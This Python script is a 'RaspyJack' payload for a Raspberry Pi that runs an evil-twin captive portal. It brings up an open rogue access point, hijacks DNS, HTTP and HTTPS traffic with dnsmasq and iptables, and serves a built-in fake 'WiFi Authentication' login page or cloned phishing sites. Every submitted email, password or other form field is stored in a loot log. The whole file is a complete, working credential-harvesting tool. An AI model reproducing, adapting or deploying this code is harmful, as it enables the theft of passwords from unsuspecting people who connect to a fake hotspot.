#!/usr/bin/env python3
"""
RaspyJack Payload -- Captive Portal
====================================
Author: 7h30th3r0n3

Full captive portal with menu-driven management: start/stop/restart the AP,
select portal page from DNSSpoof/sites/ or built-in templates, edit SSID,
manage MAC whitelist, view captured credentials.

Setup / Prerequisites
---------------------
- USB WiFi dongle with AP mode support (e.g. Alfa AWUS036ACH)
- apt install hostapd dnsmasq-base
- Optional: phishing templates in /root/Raspyjack/DNSSpoof/sites/
- Dongle is auto-detected via select_interface (onboard wlan0 reserved)

Controls:
  UP/DOWN  -- Navigate menu / scroll
  LEFT     -- Delete char (SSID editor)
  RIGHT    -- Add char (SSID editor)
  OK       -- Select action / confirm
  KEY1     -- Quick toggle portal on/off
  KEY3     -- Back / Exit
"""

import os
import sys
import time
import json
import signal
import threading
import subprocess
import re
from datetime import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import parse_qs, unquote_plus
from socketserver import ThreadingMixIn

sys.path.append(os.path.abspath(os.path.join(__file__, "..", "..", "..")))

import RPi.GPIO as GPIO
import LCD_1in44, LCD_Config
from PIL import Image, ImageDraw, ImageFont
from payloads._display_helper import ScaledDraw, scaled_font
from payloads._input_helper import get_button
from payloads._keyboard_helper import lcd_keyboard
from payloads._iface_helper import select_interface

PINS = {
    "UP": 6, "DOWN": 19, "LEFT": 5, "RIGHT": 26,
    "OK": 13, "KEY1": 21, "KEY2": 20, "KEY3": 16,
}
GPIO.setmode(GPIO.BCM)
for pin in PINS.values():
    GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)

LCD = LCD_1in44.LCD()
LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
WIDTH, HEIGHT = LCD.width, LCD.height
font = scaled_font()

# ---------------------------------------------------------------------------
# Paths & constants
# ---------------------------------------------------------------------------
PORTAL_DIR = "/root/Raspyjack/DNSSpoof/sites"
LOOT_DIR = "/root/Raspyjack/loot/Portal"
CONFIG_PATH = os.path.join(LOOT_DIR, "portal_config.json")
WHITELIST_PATH = os.path.join(LOOT_DIR, "whitelist.json")
CREDS_LOG = os.path.join(LOOT_DIR, "creds.log")
HOSTAPD_CONF = "/tmp/rj_portal_hostapd.conf"
DNSMASQ_CONF = "/tmp/rj_portal_dnsmasq.conf"
GATEWAY_IP = "10.0.77.1"
DHCP_RANGE = "10.0.77.10,10.0.77.250,12h"
HTTP_PORT = 80
ROW_H = 12
ROWS_VISIBLE = 7
os.makedirs(LOOT_DIR, exist_ok=True)

VIEW_MENU = "menu"
VIEW_STATUS = "status"
VIEW_SELECT = "select_portal"
VIEW_WHITELIST = "whitelist"
VIEW_CREDS = "creds"
VIEW_SSID = "edit_ssid"

MENU_ITEMS = [
    "Status", "Start Portal", "Stop Portal",
    "Restart Portal", "Select Portal", "Set SSID",
    "Whitelist", "View Creds",
]

SSID_CHARS = list(
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789 -_."
)

_PORTAL_FILES = ("index.html", "login.html", "index.php")

# ---------------------------------------------------------------------------
# Built-in templates
# ---------------------------------------------------------------------------

BUILTIN_WIFI_LOGIN = """<!DOCTYPE html>
<html><head><title>WiFi Login</title>
<meta name="viewport" content="width=device-width,initial-scale=1">
<style>
body{font-family:Arial,sans-serif;background:#1a1a2e;color:#fff;
display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0}
.box{background:#16213e;padding:30px;border-radius:12px;
box-shadow:0 4px 20px rgba(0,0,0,.4);max-width:380px;width:90%}
h2{margin-top:0;color:#e94560}
input{width:100%;padding:12px;margin:8px 0;border:1px solid #0f3460;
border-radius:6px;box-sizing:border-box;background:#1a1a2e;color:#fff}
button{width:100%;padding:14px;background:#e94560;color:#fff;border:none;
border-radius:6px;cursor:pointer;font-size:16px;margin-top:10px}
</style></head><body>
<div class="box">
<h2>WiFi Authentication</h2>
<p>Please sign in to access the network.</p>
<form method="POST" action="/login">
<input name="email" placeholder="Email" required>
<input name="password" type="password" placeholder="Password" required>
<button type="submit">Connect</button>
</form></div></body></html>"""

BUILTIN_SUCCESS = """<!DOCTYPE html>
<html><head><title>Connected</title>
<meta name="viewport" content="width=device-width,initial-scale=1">
<style>body{font-family:Arial,sans-serif;text-align:center;padding:60px;
background:#1a1a2e;color:#fff}
h2{color:#4ecca3}.check{font-size:64px;color:#4ecca3}</style></head>
<body><div class="check">&#10003;</div>
<h2>Connected!</h2><p>You are now online.</p></body></html>"""

# ---------------------------------------------------------------------------
# Shared state
# ---------------------------------------------------------------------------
lock = threading.Lock()
view = VIEW_MENU
menu_idx = 0
scroll_pos = 0
status_msg = "Idle"
portal_running = False
running = True
credentials = []
clients_connected = 0

# SSID editor state
ssid_chars = []
ssid_char_idx = 0

# Process handles
_hostapd_proc = None
_dnsmasq_proc = None
_portal_server = None
_iface = None

# ---------------------------------------------------------------------------
# JSON file helpers
# ---------------------------------------------------------------------------

def _load_json(path, default):
    try:
        with open(path, "r") as f:
            return json.load(f)
    except Exception:
        return default


def _save_json(path, data):
    try:
        with open(path, "w") as f:
            json.dump(data, f, indent=2)
    except Exception:
        pass


def _load_config():
    return _load_json(CONFIG_PATH, {"selected_portal": "", "ssid": "FreeWiFi"})


def _save_config(cfg):
    _save_json(CONFIG_PATH, cfg)


def _load_whitelist():
    return _load_json(WHITELIST_PATH, [])


def _save_whitelist(wl):
    _save_json(WHITELIST_PATH, wl)


# ---------------------------------------------------------------------------
# Portal discovery
# ---------------------------------------------------------------------------

def _discover_portals():
    """Scan PORTAL_DIR for subdirectories containing a portal page."""
    portals = []
    if not os.path.isdir(PORTAL_DIR):
        return portals
    try:
        for entry in sorted(os.listdir(PORTAL_DIR)):
            entry_path = os.path.join(PORTAL_DIR, entry)
            if not os.path.isdir(entry_path):
                continue
            for pf in _PORTAL_FILES:
                if os.path.isfile(os.path.join(entry_path, pf)):
                    portals.append(entry)
                    break
    except Exception:
        pass
    return portals


def _find_portal_page(portal_name):
    """Return the main HTML file path for a portal."""
    portal_path = os.path.join(PORTAL_DIR, portal_name)
    for pf in _PORTAL_FILES:
        fp = os.path.join(portal_path, pf)
        if os.path.isfile(fp):
            return fp
    return None


def _count_clients():
    """Count connected clients via hostapd_cli."""
    try:
        result = subprocess.run(
            ["sudo", "hostapd_cli", "all_sta"],
            capture_output=True, text=True, timeout=5,
        )
        macs = re.findall(r"[0-9a-f:]{17}", result.stdout, re.I)
        return len(set(macs))
    except Exception:
        return 0


def _count_creds():
    """Count credential lines in the log file."""
    try:
        with open(CREDS_LOG, "r") as f:
            return sum(1 for ln in f if ln.strip())
    except Exception:
        return 0


# ---------------------------------------------------------------------------
# HTTP credential-capture server
# ---------------------------------------------------------------------------

class CaptiveHandler(BaseHTTPRequestHandler):
    """Serve captive portal pages and capture POST credentials."""

    template_html = BUILTIN_WIFI_LOGIN
    template_dir = None

    def _serve_file(self, filepath, content_type="text/html"):
        try:
            with open(filepath, "rb") as fh:
                data = fh.read()
            self.send_response(200)
            self.send_header("Content-Type", content_type)
            self.send_header("Content-Length", str(len(data)))
            self.end_headers()
            self.wfile.write(data)
        except FileNotFoundError:
            self.send_error(404)

    def _guess_content_type(self, path):
        ext = os.path.splitext(path)[1].lower()
        types = {
            ".html": "text/html", ".htm": "text/html",
            ".css": "text/css", ".js": "application/javascript",
            ".png": "image/png", ".jpg": "image/jpeg",
            ".jpeg": "image/jpeg", ".gif": "image/gif",
            ".svg": "image/svg+xml", ".ico": "image/x-icon",
            ".php": "text/html",
        }
        return types.get(ext, "application/octet-stream")

    def do_GET(self):
        path = self.path.split("?")[0]

        if self.template_dir:
            if path in ("/", ""):
                for fname in _PORTAL_FILES:
                    fpath = os.path.join(self.template_dir, fname)
                    if os.path.isfile(fpath):
                        self._serve_file(fpath)
                        return
                self.send_error(404)
            else:
                safe_path = path.lstrip("/").replace("..", "")
                fpath = os.path.join(self.template_dir, safe_path)
                if os.path.isfile(fpath):
                    ct = self._guess_content_type(fpath)
                    self._serve_file(fpath, ct)
                else:
                    # Fallback: redirect unknown paths to /
                    self.send_response(302)
                    self.send_header("Location", "/")
                    self.end_headers()
        else:
            html = self.template_html.encode("utf-8")
            self.send_response(200)
            self.send_header("Content-Type", "text/html")
            self.send_header("Content-Length", str(len(html)))
            self.end_headers()
            self.wfile.write(html)

    def do_POST(self):
        content_len = int(self.headers.get("Content-Length", 0))
        body = ""
        if content_len > 0:
            body = self.rfile.read(content_len).decode("utf-8", errors="replace")

        params = parse_qs(body)
        cred_entry = {
            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "src_ip": self.client_address[0],
            "path": self.path,
            "fields": {},
        }
        for key, values in params.items():
            cred_entry["fields"][key] = unquote_plus(values[0]) if values else ""

        if cred_entry["fields"]:
            with lock:
                credentials.append(cred_entry)
            # Also append to creds.log for persistent storage
            _append_creds_log(cred_entry)

        # Serve success page
        html = BUILTIN_SUCCESS.encode("utf-8")
        self.send_response(200)
        self.send_header("Content-Type", "text/html")
        self.send_header("Content-Length", str(len(html)))
        self.end_headers()
        self.wfile.write(html)

    def log_message(self, fmt, *args):
        pass


class ThreadedPortalServer(ThreadingMixIn, HTTPServer):
    daemon_threads = True


def _append_creds_log(entry):
    """Append a credential entry to the persistent log file."""
    try:
        fields = entry.get("fields", {})
        line = (
            f"[{entry['timestamp']}] {entry['src_ip']} "
            f"{' '.join(f'{k}={v}' for k, v in fields.items())}"
        )
        with open(CREDS_LOG, "a") as f:
            f.write(line + "\n")
    except Exception:
        pass


# ---------------------------------------------------------------------------
# Network helpers
# ---------------------------------------------------------------------------

def _run(cmd):
    subprocess.run(cmd, capture_output=True, timeout=5)


def _set_managed_mode(iface):
    """Restore managed mode on interface."""
    for cmd in (
        ["sudo", "ip", "link", "set", iface, "down"],
        ["sudo", "iw", "dev", iface, "set", "type", "managed"],
        ["sudo", "ip", "link", "set", iface, "up"],
    ):
        _run(cmd)


def _write_hostapd_conf(iface, ssid_str, channel=6):
    with open(HOSTAPD_CONF, "w") as f:
        f.write(
            f"interface={iface}\ndriver=nl80211\nssid={ssid_str}\n"
            f"hw_mode=g\nchannel={channel}\nwmm_enabled=0\n"
            f"auth_algs=1\nwpa=0\nignore_broadcast_ssid=0\n"
        )


def _write_dnsmasq_conf(iface):
    with open(DNSMASQ_CONF, "w") as f:
        f.write(
            f"interface={iface}\ndhcp-range={DHCP_RANGE}\n"
            f"dhcp-option=3,{GATEWAY_IP}\ndhcp-option=6,{GATEWAY_IP}\n"
            f"address=/#/{GATEWAY_IP}\nno-resolv\nlog-queries\nlog-dhcp\n"
        )


def _iptables_whitelist_add(iface, mac):
    _run(["sudo", "iptables", "-t", "nat", "-I", "PREROUTING",
          "-i", iface, "-m", "mac", "--mac-source", mac, "-j", "ACCEPT"])


def _setup_iptables(iface):
    """Redirect HTTP (80), HTTPS (443), and DNS (53) to the portal."""
    for dport, proto in [("80", "tcp"), ("443", "tcp"), ("53", "udp")]:
        if proto == "udp":
            dest = f"{GATEWAY_IP}:53"
        else:
            dest = f"{GATEWAY_IP}:{HTTP_PORT}"
        _run(["sudo", "iptables", "-t", "nat", "-A", "PREROUTING",
              "-i", iface, "-p", proto, "--dport", dport,
              "-j", "DNAT", "--to-destination", dest])
    # MASQUERADE for captive portal detection on modern devices
    _run(["sudo", "iptables", "-t", "nat", "-A", "POSTROUTING",
          "-j", "MASQUERADE"])
    # Enable IP forwarding
    _run(["sudo", "sysctl", "-w", "net.ipv4.ip_forward=1"])
    # Apply whitelist entries
    for mac in _load_whitelist():
        _iptables_whitelist_add(iface, mac)


def _teardown_iptables():
    _run(["sudo", "iptables", "-t", "nat", "-F"])
    _run(["sudo", "sysctl", "-w", "net.ipv4.ip_forward=0"])


# ---------------------------------------------------------------------------
# Client counter thread
# ---------------------------------------------------------------------------

def _client_counter_loop():
    """Periodically update connected client count."""
    global clients_connected
    while running and portal_running:
        count = _count_clients()
        with lock:
            clients_connected = count
        time.sleep(5)


# ---------------------------------------------------------------------------
# Service lifecycle
# ---------------------------------------------------------------------------

def _start_portal():
    global portal_running, status_msg
    global _hostapd_proc, _dnsmasq_proc, _portal_server

    iface = _iface
    if not iface:
        with lock:
            status_msg = "No WiFi interface"
        return

    cfg = _load_config()
    portal_name = cfg.get("selected_portal", "")
    ssid_str = cfg.get("ssid", "FreeWiFi")
    use_builtin = not portal_name
    portal_path = None

    if portal_name:
        portal_path = os.path.join(PORTAL_DIR, portal_name)
        if not os.path.isdir(portal_path):
            with lock:
                status_msg = "Portal dir missing"
            return

        # Auto-create redirect if no index.html
        idx_path = os.path.join(portal_path, "index.html")
        if not os.path.isfile(idx_path):
            target = None
            for candidate in ("login.html", "index.php"):
                if os.path.isfile(os.path.join(portal_path, candidate)):
                    target = candidate
                    break
            if not target:
                html_files = [
                    f for f in os.listdir(portal_path) if f.endswith(".html")
                ]
                if html_files:
                    target = html_files[0]
            if target:
                with open(idx_path, "w") as fh:
                    fh.write(
                        f'<meta http-equiv="refresh" content="0;url=/{target}">'
                    )

    with lock:
        status_msg = "Configuring..."

    # Prepare interface
    _set_managed_mode(iface)
    time.sleep(0.3)
    _run(["sudo", "ip", "addr", "flush", "dev", iface])
    _run(["sudo", "ip", "addr", "add", f"{GATEWAY_IP}/24", "dev", iface])
    _run(["sudo", "ip", "link", "set", iface, "up"])

    # Kill stale processes
    for proc_name in ("hostapd", "dnsmasq"):
        _run(["sudo", "killall", proc_name])
    time.sleep(0.3)

    # Start hostapd
    _write_hostapd_conf(iface, ssid_str)
    with lock:
        status_msg = "Starting hostapd..."
    try:
        _hostapd_proc = subprocess.Popen(
            ["sudo", "hostapd", HOSTAPD_CONF],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
        )
    except Exception as exc:
        with lock:
            status_msg = f"hostapd err: {exc}"
        return
    time.sleep(1.5)
    if _hostapd_proc.poll() is not None:
        with lock:
            status_msg = "hostapd failed"
        return

    # Start dnsmasq
    _write_dnsmasq_conf(iface)
    with lock:
        status_msg = "Starting dnsmasq..."
    try:
        _dnsmasq_proc = subprocess.Popen(
            ["sudo", "dnsmasq", "-C", DNSMASQ_CONF, "--no-daemon"],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
        )
    except Exception as exc:
        with lock:
            status_msg = f"dnsmasq err: {exc}"
        return
    time.sleep(0.5)
    if _dnsmasq_proc.poll() is not None:
        with lock:
            status_msg = "dnsmasq failed"
        return

    # Configure HTTP handler
    if use_builtin:
        CaptiveHandler.template_html = BUILTIN_WIFI_LOGIN
        CaptiveHandler.template_dir = None
    else:
        CaptiveHandler.template_dir = portal_path

    # Start threaded HTTP server with credential capture
    with lock:
        status_msg = "Starting HTTP..."
    try:
        _portal_server = ThreadedPortalServer(
            ("0.0.0.0", HTTP_PORT), CaptiveHandler,
        )
        threading.Thread(
            target=_portal_server.serve_forever, daemon=True,
        ).start()
    except Exception as exc:
        if _dnsmasq_proc:
            _dnsmasq_proc.terminate()
        if _hostapd_proc:
            _hostapd_proc.terminate()
        with lock:
            status_msg = f"HTTP err: {exc}"
        return

    # Iptables redirect (80 + 443 + DNS)
    _setup_iptables(iface)

    label = portal_name if portal_name else "Built-in"
    with lock:
        portal_running = True
        status_msg = f"Portal '{label}' live"

    # Start client counter thread
    threading.Thread(target=_client_counter_loop, daemon=True).start()


def _stop_portal():
    global portal_running, status_msg
    global _hostapd_proc, _dnsmasq_proc, _portal_server

    with lock:
        status_msg = "Stopping..."

    # Shut down HTTP server
    if _portal_server:
        try:
            _portal_server.shutdown()
        except Exception:
            pass
        _portal_server = None

    # Terminate hostapd
    if _hostapd_proc and _hostapd_proc.poll() is None:
        _hostapd_proc.terminate()
        try:
            _hostapd_proc.wait(timeout=5)
        except subprocess.TimeoutExpired:
            _hostapd_proc.kill()
    _hostapd_proc = None

    # Terminate dnsmasq
    if _dnsmasq_proc and _dnsmasq_proc.poll() is None:
        _dnsmasq_proc.terminate()
        try:
            _dnsmasq_proc.wait(timeout=5)
        except subprocess.TimeoutExpired:
            _dnsmasq_proc.kill()
    _dnsmasq_proc = None

    # Kill any strays
    for proc_name in ("hostapd", "dnsmasq"):
        _run(["sudo", "killall", proc_name])

    _teardown_iptables()

    # Clean temp files
    for path in (HOSTAPD_CONF, DNSMASQ_CONF):
        try:
            os.remove(path)
        except OSError:
            pass

    # Restore interface
    if _iface:
        _set_managed_mode(_iface)

    with lock:
        portal_running = False
        status_msg = "Portal stopped"


def _restart_portal():
    _stop_portal()
    time.sleep(0.5)
    _start_portal()


# ---------------------------------------------------------------------------
# Draw helpers  (128-base ScaledDraw coordinates)
# ---------------------------------------------------------------------------

def _draw_header(d, title):
    d.rectangle((0, 0, 127, 13), fill="#111")
    d.text((2, 1), title, font=font, fill="#00CCFF")


def _draw_footer(d, text):
    d.rectangle((0, 116, 127, 127), fill="#111")
    d.text((2, 117), text, font=font, fill="#888")


def _new_frame():
    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
    return img, ScaledDraw(img)


# ---------------------------------------------------------------------------
# View renderers
# ---------------------------------------------------------------------------

def draw_menu():
    img, d = _new_frame()
    _draw_header(d, "CAPTIVE PORTAL")
    with lock:
        idx = menu_idx
        is_running = portal_running
    tag = "[ON]" if is_running else "[OFF]"
    d.text((95, 1), tag, font=font, fill="#00FF00" if is_running else "#FF4444")
    for i, item in enumerate(MENU_ITEMS):
        y = 16 + i * ROW_H
        if y > 110:
            break
        sel = i == idx
        d.text((2, y), f"{'>' if sel else ' '} {item}", font=font,
               fill="#00CCFF" if sel else "#AAAAAA")
    _draw_footer(d, "OK:Select K1:Toggle")
    LCD.LCD_ShowImage(img, 0, 0)


def draw_status():
    img, d = _new_frame()
    _draw_header(d, "PORTAL STATUS")
    with lock:
        up = portal_running
        msg = status_msg
        cli = clients_connected
    cfg = _load_config()
    name = cfg.get("selected_portal", "") or "Built-in"
    ssid_val = cfg.get("ssid", "FreeWiFi")
    cred_count = _count_creds()

    d.text((2, 18), "Service:", font=font, fill="#888")
    d.text((55, 18), "RUNNING" if up else "STOPPED", font=font,
           fill="#00FF00" if up else "#FF4444")
    d.text((2, 34), "Portal:", font=font, fill="#888")
    d.text((46, 34), name[:14], font=font, fill="#FFFFFF")
    d.text((2, 50), "SSID:", font=font, fill="#888")
    d.text((36, 50), ssid_val[:16], font=font, fill="#00CCFF")
    d.text((2, 66), "Clients:", font=font, fill="#888")
    d.text((55, 66), str(cli), font=font, fill="#FFAA00")
    d.text((2, 78), "Creds:", font=font, fill="#888")
    d.text((42, 78), str(cred_count), font=font,
           fill="#FF4444" if cred_count else "#666")
    if up:
        d.text((2, 90), f"IP: {GATEWAY_IP}", font=font, fill="#666")
    d.text((2, 102), msg[:22], font=font, fill="#FFAA00")
    _draw_footer(d, "K3:Back")
    LCD.LCD_ShowImage(img, 0, 0)


def draw_select_portal():
    img, d = _new_frame()
    _draw_header(d, "SELECT PORTAL")
    portals = _discover_portals()
    current = _load_config().get("selected_portal", "")
    with lock:
        sc = scroll_pos
    if not portals:
        d.text((4, 40), "No portals found", font=font, fill="#FF4444")
        d.text((4, 54), "Add dirs to:", font=font, fill="#666")
        d.text((4, 66), "DNSSpoof/sites/", font=font, fill="#666")
        d.text((4, 82), "Or leave empty for", font=font, fill="#666")
        d.text((4, 94), "built-in template", font=font, fill="#666")
    else:
        for i, name in enumerate(portals[sc:sc + ROWS_VISIBLE]):
            y = 16 + i * ROW_H
            actual_idx = sc + i
            active = name == current
            sel = actual_idx == sc
            color = "#00FF00" if active else "#00CCFF" if sel else "#AAAAAA"
            d.text(
                (2, y),
                f"{'>' if sel else ' '}{'*' if active else ' '}{name[:17]}",
                font=font, fill=color,
            )
    _draw_footer(d, "OK:Select K3:Back")
    LCD.LCD_ShowImage(img, 0, 0)


def draw_whitelist():
    img, d = _new_frame()
    _draw_header(d, "WHITELIST")
    wl = _load_whitelist()
    with lock:
        sc = scroll_pos
    if not wl:
        d.text((4, 40), "No whitelisted MACs", font=font, fill="#666")
        d.text((4, 54), "OK adds last DHCP", font=font, fill="#666")
        d.text((4, 66), "lease to whitelist", font=font, fill="#666")
    else:
        for i, mac in enumerate(wl[sc:sc + ROWS_VISIBLE]):
            y = 16 + i * ROW_H
            sel = (sc + i) == sc
            d.text((2, y), f"{'>' if sel else ' '}{mac}", font=font,
                   fill="#00CCFF" if sel else "#AAAAAA")
    _draw_footer(d, f"{len(wl)} MACs OK:Add K3:Bk")
    LCD.LCD_ShowImage(img, 0, 0)


def draw_creds():
    img, d = _new_frame()
    _draw_header(d, "CAPTURED CREDS")
    cred_lines = []
    try:
        with open(CREDS_LOG, "r") as f:
            cred_lines = f.read().splitlines()
    except Exception:
        pass
    # Also show in-memory credentials not yet flushed
    with lock:
        mem_count = len(credentials)
        sc = scroll_pos
    if not cred_lines and mem_count == 0:
        d.text((10, 50), "No creds yet", font=font, fill="#666")
    else:
        for i, line in enumerate(cred_lines[sc:sc + ROWS_VISIBLE]):
            d.text((2, 16 + i * ROW_H), line[:22], font=font, fill="#FFAA00")
    _draw_footer(d, f"{len(cred_lines)} lines  K3:Back")
    LCD.LCD_ShowImage(img, 0, 0)


def draw_ssid_editor():
    img, d = _new_frame()
    _draw_header(d, "EDIT SSID")
    display = "".join(ssid_chars)
    d.text((4, 20), display[:20], font=font, fill="#FFFFFF")
    if len(display) > 20:
        d.text((4, 32), display[20:], font=font, fill="#FFFFFF")
    d.text((4, 50), f"Char: {SSID_CHARS[ssid_char_idx]}", font=font,
           fill="#00CCFF")
    d.text((4, 66), "U/D:char R:add L:del", font=font, fill="#666")
    d.text((4, 78), "OK:confirm", font=font, fill="#666")
    _draw_footer(d, f"Len: {len(ssid_chars)}/30  K3:Bk")
    LCD.LCD_ShowImage(img, 0, 0)


# ---------------------------------------------------------------------------
# SSID editor init
# ---------------------------------------------------------------------------

def _init_ssid_editor():
    global ssid_chars, ssid_char_idx
    cfg = _load_config()
    current = cfg.get("ssid", "FreeWiFi")
    ssid_chars = list(current)
    ssid_char_idx = 0


# ---------------------------------------------------------------------------
# Whitelist management
# ---------------------------------------------------------------------------

def _add_client_to_whitelist():
    """Add the most recent DHCP lease MAC to the whitelist."""
    try:
        with open("/var/lib/misc/dnsmasq.leases", "r") as f:
            lines = f.read().splitlines()
    except Exception:
        return "No leases found"
    if not lines:
        return "No leases"
    parts = lines[-1].strip().split()
    if len(parts) < 2:
        return "Parse error"
    mac = parts[1].upper()
    wl = _load_whitelist()
    if mac in wl:
        return f"{mac} exists"
    new_wl = list(wl) + [mac]
    _save_whitelist(new_wl)
    if portal_running and _iface:
        _iptables_whitelist_add(_iface, mac)
    return f"Added {mac}"


def _remove_whitelist_entry(idx):
    """Remove whitelist entry by index."""
    wl = _load_whitelist()
    if 0 <= idx < len(wl):
        removed = wl[idx]
        _save_whitelist(wl[:idx] + wl[idx + 1:])
        return f"Removed {removed}"
    return "Invalid index"


# ---------------------------------------------------------------------------
# Signal handling
# ---------------------------------------------------------------------------

def _signal_handler(_sig, _frame):
    global running
    running = False


signal.signal(signal.SIGINT, _signal_handler)
signal.signal(signal.SIGTERM, _signal_handler)


# ---------------------------------------------------------------------------
# Menu dispatch
# ---------------------------------------------------------------------------

def _handle_menu_select():
    global view, scroll_pos
    action = MENU_ITEMS[menu_idx]
    if action == "Status":
        with lock:
            view = VIEW_STATUS
            scroll_pos = 0
    elif action in ("Start Portal", "Stop Portal", "Restart Portal"):
        target = {
            "Start Portal": _start_portal,
            "Stop Portal": _stop_portal,
            "Restart Portal": _restart_portal,
        }[action]
        threading.Thread(target=target, daemon=True).start()
        with lock:
            view = VIEW_STATUS
    elif action == "Select Portal":
        with lock:
            view = VIEW_SELECT
            scroll_pos = 0
    elif action == "Set SSID":
        _init_ssid_editor()
        with lock:
            view = VIEW_SSID
    elif action == "Whitelist":
        with lock:
            view = VIEW_WHITELIST
            scroll_pos = 0
    elif action == "View Creds":
        with lock:
            view = VIEW_CREDS
            scroll_pos = 0


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def main():
    global view, menu_idx, scroll_pos, status_msg, portal_running, running
    global ssid_char_idx, ssid_chars, _iface

    # Interface selection at startup
    _iface = select_interface(LCD, font, PINS, GPIO, iface_type="wifi")
    if not _iface:
        GPIO.cleanup()
        return 1

    # Splash screen
    img, d = _new_frame()
    d.text((6, 16), "CAPTIVE PORTAL", font=font, fill="#FF4444")
    d.text((4, 36), "WiFi credential", font=font, fill="#888")
    d.text((4, 48), "capture portal", font=font, fill="#888")
    d.text((4, 68), f"Iface: {_iface}", font=font, fill="#00CCFF")
    d.text((4, 80), "UP/DN:Nav  OK:Select", font=font, fill="#666")
    d.text((4, 92), "K1:Toggle  K3:Exit", font=font, fill="#666")
    LCD.LCD_ShowImage(img, 0, 0)
    time.sleep(1.0)

    try:
        while running:
            btn = get_button(PINS, GPIO)

            if btn == "KEY3":
                if view == VIEW_MENU:
                    break
                with lock:
                    view = VIEW_MENU
                    scroll_pos = 0
                time.sleep(0.25)
                continue

            if btn == "KEY1":
                target = _stop_portal if portal_running else _start_portal
                threading.Thread(target=target, daemon=True).start()
                time.sleep(0.3)
                continue

            if view == VIEW_MENU:
                if btn == "UP":
                    with lock:
                        menu_idx = max(0, menu_idx - 1)
                    time.sleep(0.15)
                elif btn == "DOWN":
                    with lock:
                        menu_idx = min(len(MENU_ITEMS) - 1, menu_idx + 1)
                    time.sleep(0.15)
                elif btn == "OK":
                    _handle_menu_select()
                    time.sleep(0.25)
                draw_menu()

            elif view == VIEW_STATUS:
                draw_status()

            elif view == VIEW_SELECT:
                portals = _discover_portals()
                if btn == "UP":
                    with lock:
                        scroll_pos = max(0, scroll_pos - 1)
                    time.sleep(0.15)
                elif btn == "DOWN":
                    with lock:
                        scroll_pos = min(
                            max(0, len(portals) - 1), scroll_pos + 1,
                        )
                    time.sleep(0.15)
                elif btn == "OK" and portals:
                    with lock:
                        idx = scroll_pos
                    if 0 <= idx < len(portals):
                        cfg = dict(_load_config())
                        cfg["selected_portal"] = portals[idx]
                        _save_config(cfg)
                        with lock:
                            status_msg = f"Set: {portals[idx]}"
                    time.sleep(0.25)
                draw_select_portal()

            elif view == VIEW_WHITELIST:
                wl = _load_whitelist()
                if btn == "UP":
                    with lock:
                        scroll_pos = max(0, scroll_pos - 1)
                    time.sleep(0.15)
                elif btn == "DOWN":
                    with lock:
                        scroll_pos = min(
                            max(0, len(wl) - 1), scroll_pos + 1,
                        )
                    time.sleep(0.15)
                elif btn == "OK":
                    msg = _add_client_to_whitelist()
                    with lock:
                        status_msg = msg
                    time.sleep(0.25)
                elif btn == "KEY2":
                    with lock:
                        idx = scroll_pos
                    msg = _remove_whitelist_entry(idx)
                    with lock:
                        status_msg = msg
                        scroll_pos = 0
                    time.sleep(0.25)
                draw_whitelist()

            elif view == VIEW_SSID:
                cfg = _load_config()
                current_ssid = cfg.get("ssid", "FreeWiFi")
                result = lcd_keyboard(LCD, font, PINS, GPIO, title="EDIT SSID", default=current_ssid)
                if result is not None:
                    new_ssid = result or "FreeWiFi"
                    cfg = dict(_load_config())
                    cfg["ssid"] = new_ssid
                    _save_config(cfg)
                    with lock:
                        status_msg = f"SSID: {new_ssid[:16]}"
                with lock:
                    view = VIEW_MENU
                time.sleep(0.25)

            elif view == VIEW_CREDS:
                try:
                    with open(CREDS_LOG, "r") as f:
                        total = len(f.read().splitlines())
                except Exception:
                    total = 0
                if btn == "UP":
                    with lock:
                        scroll_pos = max(0, scroll_pos - 1)
                    time.sleep(0.15)
                elif btn == "DOWN":
                    with lock:
                        scroll_pos = min(
                            max(0, total - 1), scroll_pos + 1,
                        )
                    time.sleep(0.15)
                draw_creds()

            time.sleep(0.05)

    finally:
        if portal_running:
            _stop_portal()
        try:
            LCD.LCD_Clear()
        except Exception:
            pass
        GPIO.cleanup()

    return 0


if __name__ == "__main__":
    raise SystemExit(main())
